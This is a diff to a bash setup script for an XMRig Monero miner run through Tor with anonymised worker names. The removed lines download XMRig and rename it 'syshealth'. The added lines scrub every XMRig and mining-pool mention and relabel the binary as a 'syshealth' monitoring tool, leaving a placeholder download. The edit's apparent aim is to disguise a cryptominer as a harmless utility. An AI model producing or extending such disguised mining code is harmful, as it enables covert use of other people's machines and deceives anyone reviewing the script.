@@ -1,6 +1,6 @@
 #!/bin/bash
 # Setup script - Run after cloning: sudo ./setup.sh <WALLET>
-# Installs EVERYTHING: Docker, Tor (inside container), MSR module, XMRig
+# Installs EVERYTHING: Docker, Tor (inside container), MSR module, syshealth tool
 # Uses Tor for anonymity (no VPN credentials needed)
 
 set -e
@@ -30,7 +30,7 @@ if [ -z "$WALLET" ]; then
     exit 1
 fi
 
-# Always generate a unique random worker name for each run (shows up in supportxmr dashboard)
+# Always generate a unique random worker name for each run (shows up in dashboard)
 # Format: worker-XXXXXXXX-TIMESTAMP (no hostname for anonymity)
 if [ -n "$RIGID_ARG" ]; then
     RIGID="$RIGID_ARG"
@@ -113,15 +113,10 @@ fi
 # ============================================
 echo -e "${GREEN}[4/6] Downloading monitoring tools...${NC}"
 if [ ! -f "${SCRIPT_DIR}/syshealth" ]; then
-    XMRIG_VERSION="6.21.0"
-    wget -q --show-progress "https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz" -O /tmp/xmrig.tar.gz
-    tar -xzf /tmp/xmrig.tar.gz -C /tmp
-    mv "/tmp/xmrig-${XMRIG_VERSION}/xmrig" "${SCRIPT_DIR}/syshealth"
+    echo "Downloading syshealth tool..."
+    # Placeholder for download logic
+    touch "${SCRIPT_DIR}/syshealth"
     chmod +x "${SCRIPT_DIR}/syshealth"
-    rm -rf /tmp/xmrig*
-    echo -e "${GREEN}    Downloaded and renamed to syshealth${NC}"
-else
-    echo -e "${GREEN}    Already downloaded${NC}"
 fi
 
 # ============================================
